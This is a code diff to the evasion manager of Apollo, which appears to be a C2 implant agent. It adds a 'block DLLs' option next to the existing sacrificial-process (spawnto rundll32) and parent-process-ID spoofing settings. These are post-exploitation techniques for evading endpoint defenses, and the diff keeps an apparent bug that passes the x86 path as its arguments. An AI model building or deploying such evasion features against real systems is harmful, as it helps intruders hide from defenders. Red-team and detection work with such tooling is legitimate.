@@ -4,6 +4,8 @@
 #undef SPAWNTO_x86
 #undef SPAWNTO_X64
 #undef PPID
+#undef BLOCKDLLS
+#define BLOCKDLLS
 #define SPAWNTO_X86
 #define SPAWNTO_X64
 #define PPID
@@ -21,17 +23,19 @@ namespace Apollo.Evasion
 {
     internal static class EvasionManager
     {
-        private static string SpawnTo64 = "C:\\Windows\\System32\\rundll32.exe";
-        private static string SpawnTo64Args = "";
-        private static string SpawnTo86 = "C:\\Windows\\SysWOW64\\rundll32.exe";
-        private static string SpawnTo86Args = "";
-        private static int ParentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
+        private static string _spawnTo64 = "C:\\Windows\\System32\\rundll32.exe";
+        private static string _spawnTo64Args = "";
+        private static string _spawnTo86 = "C:\\Windows\\SysWOW64\\rundll32.exe";
+        private static string _spawnTo86Args = "";
+        private static int _parentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
+        private static bool _blockDLLs = false;
 
         internal struct SacrificialProcessStartupInformation
         {
             internal string Application;
             internal string Arguments;
             internal int ParentProcessId;
+            internal bool BlockDlls;
         }
 
         internal static SacrificialProcessStartupInformation GetSacrificialProcessStartupInformation()
@@ -39,15 +43,16 @@ namespace Apollo.Evasion
             SacrificialProcessStartupInformation results = new SacrificialProcessStartupInformation();
             if (IntPtr.Size == 8)
             {
-                results.Application = SpawnTo64;
-                results.Arguments = SpawnTo64Args;
+                results.Application = _spawnTo64;
+                results.Arguments = _spawnTo64Args;
             }
             else
             {
-                results.Application = SpawnTo86;
-                results.Arguments = SpawnTo86;
+                results.Application = _spawnTo86;
+                results.Arguments = _spawnTo86;
             }
-            results.ParentProcessId = ParentProcessId;
+            results.ParentProcessId = _parentProcessId;
+            results.BlockDlls = _blockDLLs;
             return results;
         }
 
@@ -57,9 +62,9 @@ namespace Apollo.Evasion
             bool bRet = false;
             if (FileUtils.IsExecutable(fileName))
             {
-                SpawnTo64 = fileName;
+                _spawnTo64 = fileName;
                 if (!string.IsNullOrEmpty(args))
-                    SpawnTo64Args = args;
+                    _spawnTo64Args = args;
                 bRet = true;
             }
             return bRet;
@@ -71,9 +76,9 @@ namespace Apollo.Evasion
             bool bRet = false;
             if (FileUtils.IsExecutable(fileName))
             {
-                SpawnTo86 = fileName;
+                _spawnTo86 = fileName;
                 if (!string.IsNullOrEmpty(args))
-                    SpawnTo86Args = args;
+                    _spawnTo86Args = args;
                 bRet = true;
             }
             return bRet;
@@ -87,9 +92,16 @@ namespace Apollo.Evasion
             {
                 System.Diagnostics.Process.GetProcessById(processId);
                 bRet = true;
-                ParentProcessId = processId;
+                _parentProcessId = processId;
             } catch { }
             return bRet;
+        }
+#endif
+#if BLOCKDLLS
+        internal static bool BlockDlls(bool status)
+        {
+            _blockDLLs = status;
+            return true;
         }
 #endif
     }
